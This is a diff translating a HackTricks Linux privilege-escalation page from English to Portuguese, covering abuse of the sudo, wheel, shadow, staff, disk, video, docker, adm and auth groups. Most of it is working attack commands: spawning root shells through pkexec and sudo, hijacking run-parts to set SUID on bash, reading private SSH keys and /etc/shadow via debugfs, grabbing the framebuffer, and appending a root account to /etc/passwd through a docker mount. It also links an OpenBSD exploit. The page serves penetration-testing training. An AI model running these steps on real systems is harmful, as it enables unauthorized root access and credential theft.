@@ -1,13 +1,12 @@
-# Interesting Groups - Linux Privesc
+# Grupos Interessantes - Linux Privesc
 
 {{#include ../../../banners/hacktricks-training.md}}
 
-## Sudo/Admin Groups
+## Grupos Sudo/Admin
 
-### **PE - Method 1**
+### **PE - Método 1**
 
-**Sometimes**, **by default (or because some software needs it)** inside the **/etc/sudoers** file you can find some of these lines:
-
+**Às vezes**, **por padrão (ou porque algum software precisa disso)** dentro do **/etc/sudoers** você pode encontrar algumas dessas linhas:
 ```bash
 # Allow members of group sudo to execute any command
 %sudo	ALL=(ALL:ALL) ALL
@@ -15,48 +14,36 @@
 # Allow members of group admin to execute any command
 %admin 	ALL=(ALL:ALL) ALL
 ```
+Isso significa que **qualquer usuário que pertença ao grupo sudo ou admin pode executar qualquer coisa como sudo**.
 
-This means that **any user that belongs to the group sudo or admin can execute anything as sudo**.
-
-If this is the case, to **become root you can just execute**:
-
+Se este for o caso, para **se tornar root você pode apenas executar**:
 ```
 sudo su
 ```
+### PE - Método 2
 
-### PE - Method 2
-
-Find all suid binaries and check if there is the binary **Pkexec**:
-
+Encontre todos os binários suid e verifique se há o binário **Pkexec**:
 ```bash
 find / -perm -4000 2>/dev/null
 ```
-
-If you find that the binary **pkexec is a SUID binary** and you belong to **sudo** or **admin**, you could probably execute binaries as sudo using `pkexec`.\
-This is because typically those are the groups inside the **polkit policy**. This policy basically identifies which groups can use `pkexec`. Check it with:
-
+Se você descobrir que o binário **pkexec é um binário SUID** e você pertence ao **sudo** ou **admin**, você provavelmente poderá executar binários como sudo usando `pkexec`.\
+Isso ocorre porque, tipicamente, esses são os grupos dentro da **política do polkit**. Essa política basicamente identifica quais grupos podem usar `pkexec`. Verifique com:
 ```bash
 cat /etc/polkit-1/localauthority.conf.d/*
 ```
+Lá você encontrará quais grupos têm permissão para executar **pkexec** e **por padrão** em algumas distribuições linux os grupos **sudo** e **admin** aparecem.
 
-There you will find which groups are allowed to execute **pkexec** and **by default** in some linux disctros the groups **sudo** and **admin** appear.
-
-To **become root you can execute**:
-
+Para **se tornar root você pode executar**:
 ```bash
 pkexec "/bin/sh" #You will be prompted for your user password
 ```
-
-If you try to execute **pkexec** and you get this **error**:
-
+Se você tentar executar **pkexec** e receber este **erro**:
 ```bash
 polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
 ==== AUTHENTICATION FAILED ===
 Error executing command as another user: Not authorized
 ```
-
-**It's not because you don't have permissions but because you aren't connected without a GUI**. And there is a work around for this issue here: [https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903). You need **2 different ssh sessions**:
-
+**Não é porque você não tem permissões, mas porque você não está conectado sem uma GUI**. E há uma solução para esse problema aqui: [https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903). Você precisa de **2 sessões ssh diferentes**:
 ```bash:session1
 echo $$ #Step1: Get current PID
 pkexec "/bin/bash" #Step 3, execute pkexec
@@ -67,39 +54,31 @@ pkexec "/bin/bash" #Step 3, execute pkexec
 pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
 #Step 4, you will be asked in this session to authenticate to pkexec
 ```
-
 ## Wheel Group
 
-**Sometimes**, **by default** inside the **/etc/sudoers** file you can find this line:
-
+**Às vezes**, **por padrão** dentro do **/etc/sudoers** você pode encontrar esta linha:
 ```
 %wheel	ALL=(ALL:ALL) ALL
 ```
+Isso significa que **qualquer usuário que pertence ao grupo wheel pode executar qualquer coisa como sudo**.
 
-This means that **any user that belongs to the group wheel can execute anything as sudo**.
-
-If this is the case, to **become root you can just execute**:
-
+Se este for o caso, para **se tornar root você pode apenas executar**:
 ```
 sudo su
 ```
+## Grupo Shadow
 
-## Shadow Group
-
-Users from the **group shadow** can **read** the **/etc/shadow** file:
-
+Usuários do **grupo shadow** podem **ler** o arquivo **/etc/shadow**:
 ```
 -rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
 ```
+Então, leia o arquivo e tente **quebrar algumas hashes**.
 
-So, read the file and try to **crack some hashes**.
+## Grupo de Funcionários
 
-## Staff Group
+**staff**: Permite que usuários adicionem modificações locais ao sistema (`/usr/local`) sem precisar de privilégios de root (note que executáveis em `/usr/local/bin` estão na variável PATH de qualquer usuário, e podem "substituir" os executáveis em `/bin` e `/usr/bin` com o mesmo nome). Compare com o grupo "adm", que está mais relacionado à monitoramento/segurança. [\[source\]](https://wiki.debian.org/SystemGroups)
 
-**staff**: Allows users to add local modifications to the system (`/usr/local`) without needing root privileges (note that executables in `/usr/local/bin` are in the PATH variable of any user, and they may "override" the executables in `/bin` and `/usr/bin` with the same name). Compare with group "adm", which is more related to monitoring/security. [\[source\]](https://wiki.debian.org/SystemGroups)
-
-In debian distributions, `$PATH` variable show that `/usr/local/` will be run as the highest priority, whether you are a privileged user or not.
-
+Em distribuições debian, a variável `$PATH` mostra que `/usr/local/` será executado com a maior prioridade, independentemente de você ser um usuário privilegiado ou não.
 ```bash
 $ echo $PATH
 /usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
@@ -107,11 +86,9 @@ $ echo $PATH
 # echo $PATH
 /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
 ```
+Se conseguirmos sequestrar alguns programas em `/usr/local`, podemos facilmente obter acesso root.
 
-If we can hijack some programs in `/usr/local`, we can easy to get root.
-
-Hijack `run-parts` program is a way to easy to get root, because most of program will run a `run-parts` like (crontab, when ssh login).
-
+Sequestrar o programa `run-parts` é uma maneira fácil de obter root, porque a maioria dos programas executará um `run-parts`, como (crontab, quando o ssh faz login).
 ```bash
 $ cat /etc/crontab | grep run-parts
 17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
@@ -119,9 +96,7 @@ $ cat /etc/crontab | grep run-parts
 47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
 52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
 ```
-
-or When a new ssh session login.
-
+ou Quando um novo login de sessão ssh.
 ```bash
 $ pspy64
 2024/02/01 22:02:08 CMD: UID=0     PID=1      | init [2]
@@ -134,9 +109,7 @@ $ pspy64
 2024/02/01 22:02:14 CMD: UID=0     PID=17890  | sshd: mane [priv]
 2024/02/01 22:02:15 CMD: UID=0     PID=17891  | -bash
 ```
-
-**Exploit**
-
+**Explorar**
 ```bash
 # 0x1 Add a run-parts script in /usr/local/bin/
 $ vi /usr/local/bin/run-parts
@@ -155,13 +128,11 @@ $ ls -la /bin/bash
 # 0x5 root it
 $ /bin/bash -p
 ```
+## Grupo de Disco
 
-## Disk Group
+Este privilégio é quase **equivalente ao acesso root** pois você pode acessar todos os dados dentro da máquina.
 
-This privilege is almost **equivalent to root access** as you can access all the data inside of the machine.
-
-Files:`/dev/sd[a-z][1-9]`
-
+Arquivos:`/dev/sd[a-z][1-9]`
 ```bash
 df -h #Find where "/" is mounted
 debugfs /dev/sda1
@@ -170,57 +141,47 @@ debugfs: ls
 debugfs: cat /root/.ssh/id_rsa
 debugfs: cat /etc/shadow
 ```
-
-Note that using debugfs you can also **write files**. For example to copy `/tmp/asd1.txt` to `/tmp/asd2.txt` you can do:
-
+Observe que usando debugfs você também pode **escrever arquivos**. Por exemplo, para copiar `/tmp/asd1.txt` para `/tmp/asd2.txt`, você pode fazer:
 ```bash
 debugfs -w /dev/sda1
 debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
 ```
+No entanto, se você tentar **escrever arquivos de propriedade do root** (como `/etc/shadow` ou `/etc/passwd`), você terá um erro de "**Permissão negada**".
 
-However, if you try to **write files owned by root** (like `/etc/shadow` or `/etc/passwd`) you will have a "**Permission denied**" error.
+## Grupo de Vídeo
 
-## Video Group
-
-Using the command `w` you can find **who is logged on the system** and it will show an output like the following one:
-
+Usando o comando `w`, você pode descobrir **quem está logado no sistema** e ele mostrará uma saída como a seguinte:
 ```bash
 USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
 yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
 moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
 ```
+O **tty1** significa que o usuário **yossi está logado fisicamente** em um terminal na máquina.
 
-The **tty1** means that the user **yossi is logged physically** to a terminal on the machine.
-
-The **video group** has access to view the screen output. Basically you can observe the the screens. In order to do that you need to **grab the current image on the screen** in raw data and get the resolution that the screen is using. The screen data can be saved in `/dev/fb0` and you could find the resolution of this screen on `/sys/class/graphics/fb0/virtual_size`
-
+O **grupo video** tem acesso para visualizar a saída da tela. Basicamente, você pode observar as telas. Para fazer isso, você precisa **capturar a imagem atual na tela** em dados brutos e obter a resolução que a tela está usando. Os dados da tela podem ser salvos em `/dev/fb0` e você pode encontrar a resolução desta tela em `/sys/class/graphics/fb0/virtual_size`
 ```bash
 cat /dev/fb0 > /tmp/screen.raw
 cat /sys/class/graphics/fb0/virtual_size
 ```
-
-To **open** the **raw image** you can use **GIMP**, select the \*\*`screen.raw` \*\* file and select as file type **Raw image data**:
+Para **abrir** a **imagem bruta**, você pode usar **GIMP**, selecionar o arquivo **`screen.raw`** e escolher como tipo de arquivo **Dados de imagem bruta**:
 
 ![](<../../../images/image (463).png>)
 
-Then modify the Width and Height to the ones used on the screen and check different Image Types (and select the one that shows better the screen):
+Em seguida, modifique a Largura e Altura para as usadas na tela e verifique diferentes Tipos de Imagem (e selecione o que melhor mostra a tela):
 
 ![](<../../../images/image (317).png>)
 
-## Root Group
+## Grupo Root
 
-It looks like by default **members of root group** could have access to **modify** some **service** configuration files or some **libraries** files or **other interesting things** that could be used to escalate privileges...
+Parece que, por padrão, **membros do grupo root** podem ter acesso para **modificar** alguns arquivos de configuração de **serviço** ou alguns arquivos de **bibliotecas** ou **outras coisas interessantes** que podem ser usadas para escalar privilégios...
 
-**Check which files root members can modify**:
-
+**Verifique quais arquivos os membros do root podem modificar**:
 ```bash
 find / -group root -perm -g=w 2>/dev/null
 ```
+## Grupo Docker
 
-## Docker Group
-
-You can **mount the root filesystem of the host machine to an instance’s volume**, so when the instance starts it immediately loads a `chroot` into that volume. This effectively gives you root on the machine.
-
+Você pode **montar o sistema de arquivos raiz da máquina host em um volume da instância**, de modo que, quando a instância inicia, ela carrega imediatamente um `chroot` nesse volume. Isso efetivamente lhe dá acesso root na máquina.
 ```bash
 docker image #Get images from the docker service
 
@@ -232,33 +193,32 @@ echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/pa
 #Ifyou just want filesystem and network access you can startthe following container:
 docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bashbash
 ```
-
-Finally, if you don't like any of the suggestions of before, or they aren't working for some reason (docker api firewall?) you could always try to **run a privileged container and escape from it** as explained here:
+Finalmente, se você não gosta de nenhuma das sugestões anteriores, ou elas não estão funcionando por algum motivo (firewall da API do docker?), você sempre pode tentar **executar um contêiner privilegiado e escapar dele** como explicado aqui:
 
 {{#ref}}
 ../docker-security/
 {{#endref}}
 
-If you have write permissions over the docker socket read [**this post about how to escalate privileges abusing the docker socket**](../#writable-docker-socket)**.**
+Se você tiver permissões de escrita sobre o socket do docker, leia [**este post sobre como escalar privilégios abusando do socket do docker**](../#writable-docker-socket)**.**
 
 {% embed url="https://github.com/KrustyHack/docker-privilege-escalation" %}
 
 {% embed url="https://fosterelli.co/privilege-escalation-via-docker.html" %}
 
-## lxc/lxd Group
+## Grupo lxc/lxd
 
 {{#ref}}
 ./
 {{#endref}}
 
-## Adm Group
+## Grupo Adm
 
-Usually **members** of the group **`adm`** have permissions to **read log** files located inside _/var/log/_.\
-Therefore, if you have compromised a user inside this group you should definitely take a **look to the logs**.
+Normalmente, **membros** do grupo **`adm`** têm permissões para **ler arquivos de log** localizados dentro de _/var/log/_.\
+Portanto, se você comprometeu um usuário dentro deste grupo, você definitivamente deve dar uma **olhada nos logs**.
 
-## Auth group
+## Grupo Auth
 
-Inside OpenBSD the **auth** group usually can write in the folders _**/etc/skey**_ and _**/var/db/yubikey**_ if they are used.\
-These permissions may be abused with the following exploit to **escalate privileges** to root: [https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)
+Dentro do OpenBSD, o grupo **auth** geralmente pode escrever nas pastas _**/etc/skey**_ e _**/var/db/yubikey**_ se elas forem usadas.\
+Essas permissões podem ser abusadas com o seguinte exploit para **escalar privilégios** para root: [https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)
 
 {{#include ../../../banners/hacktricks-training.md}}
